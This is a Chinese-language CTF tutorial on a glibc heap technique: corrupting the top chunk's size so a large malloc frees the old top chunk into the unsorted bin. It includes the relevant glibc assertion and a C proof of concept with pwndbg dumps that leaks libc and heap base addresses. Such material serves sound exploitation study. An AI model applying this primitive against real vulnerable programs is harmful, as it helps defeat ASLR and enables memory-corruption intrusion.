除了`house of force`外，其实对于`top chunk`还有一些利用点。

---

当申请的`size`不大于`mmap`的阈值，但`top chunk`当前的大小又**不足以**分配，则会扩展`top chunk`，然后**从新`top chunk`里进行分配**。

这里的扩展`top chunk`，其实不一定会直接扩展原先的`top chunk`，**可能会先将原先的`top chunk`给`free`掉**，再在之后开辟一段新区域作为新的`top chunk`。
具体是，如果`brk`等于该不够大小的`top chunk`（被记作`old_top_chunk`）的`end`位置（`old_end`，等于`old_top + old_size`），**即`top chunk`的`size`并没有被修改**，完全是自然地分配堆块，导致了`top chunk`不够用，则会从`old_top`处开辟更大的一块空间作为新的`top chunk`，也就是将原先的`old_top_chunk`进行扩展了，此时没有`free`，且`top chunk`的起始位置也没有改变；

但是如果`brk`不等于`old_end`，则会先`free`掉`old_top_chunk`，**再从`brk`处**开辟一片空间作为`new_top_chunk`，此时的`top chunk`头部位置变为了原先的`brk`，而如今的`brk`也做了相应的扩展；

**并且`unsorted bin`或`tcache`中（一般修改的大小都至少会是`small bin`范围，但具体在哪得分情况看）会有被`free`的`old_top_chunk`。**
因此，**可以通过改小`top chunk`的`size`，再申请大堆块，做到对旧`top chunk`的`free`**，不过修改的`size`需要绕过一些检测。

相关源码如下：

```c
old_top = av->top;
old_size = chunksize (old_top);
old_end = (char *) (chunk_at_offset (old_top, old_size)); // old_end = old_top + old_size
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
```

需要绕过以上的断言，主要就是要求被修改的`top chunk`的`size`的`prev_inuse`位要为`1`并且`old_end`要内存页对齐，所以就要求被修改的`size`的**后三位和原先要保持一致**。



## 示例

假设有一个堆溢出（一个p64），那我们修改topchunk的size位，

然后申请一个0x1000的堆块触发free old topchunk => unsorted bin

这样再申请chunk就能拿到unsorted bin里面old topchuk的残留指针了。

(fd => libcbase，fd_nextsize => heapbase)



这样利用topchunk free的疏松检测以及不会清空指针的特性来泄露/利用。



```c
#include<stdio.h>
#include<stdlib.h>
#include<malloc.h>
#include<assert.h>

int main(){
	char *A = malloc(0x28);
	long long *p_A = (long long*)A;
	p_A[5] = 0x0fd1; // 0x20fd1 -> 0x0fd1
	/*
	pwndbg> heap
	Allocated chunk | PREV_INUSE
	Addr: 0x2155000
	Size: 0x31

	Top chunk | PREV_INUSE
	Addr: 0x2155030
	Size: 0xfd1

	*/
	char *trigger = malloc(0x1000);
	/*
	
	pwndbg> heap
	Allocated chunk | PREV_INUSE
	Addr: 0x2155000
	Size: 0x31

	Free chunk (unsortedbin) | PREV_INUSE
	Addr: 0x2155030
	Size: 0xfb1
	fd: 0x7fa935106b78
	bk: 0x7fa935106b78

	Allocated chunk
	Addr: 0x2155fe0
	Size: 0x10

	Allocated chunk | PREV_INUSE
	Addr: 0x2155ff0
	Size: 0x11

	Allocated chunk
	Addr: 0x2156000
	Size: 0x00

	unsortedbin
	all: 0x2155030 —▸ 0x7fa935106b78 (main_arena+88) ◂— 0x2155030

	
	*/
	char *p = malloc(0x100);
	/*
	pwndbg> x/8gx 0x2155030
	0x2155030:	0x0000000000000000	0x0000000000000111
	0x2155040:	0x00007fa935107188	0x00007fa935107188
	0x2155050:	0x0000000002155030	0x0000000002155030
	0x2155060:	0x0000000000000000	0x0000000000000000

	*/
	long long *p_p = (long long*)p;
	printf("Now we have a chunk with unsorted bin's fd and fd_nextsize\n");
	printf("fd: %p\nfd_nextsize: %p\n",p_p[0],p_p[2]);
	printf("And we have fd = %p is @ <main_arena+1640>\n",p_p[0]);
	printf("So we have libcbase = fd - 1640 - 0x10 - libc.sym['__malloc_hook']\n");
	printf("Also, fd_nextsize = %p is point to the previous topchunk itself\n",p_p[2]);
	printf("So we have heapbase = fd_nextsize - 0x30\n");
	return 0;
}
/*
root@937459dee7b2:/home/ctf/pwn# ./topchunk 
Now we have a chunk with unsorted bin's fd and fd_nextsize
fd: 0x7fe1c4e55188
fd_nextsize: 0x87e030
And we have fd = 0x7fe1c4e55188 is @ <main_arena+1640>
So we have libcbase = fd - 1640 - 0x10 - libc.sym['__malloc_hook']
Also, fd_nextsize = 0x87e030 is point to the previous topchunk itself
So we have heapbase = fd_nextsize - 0x30
*/
```

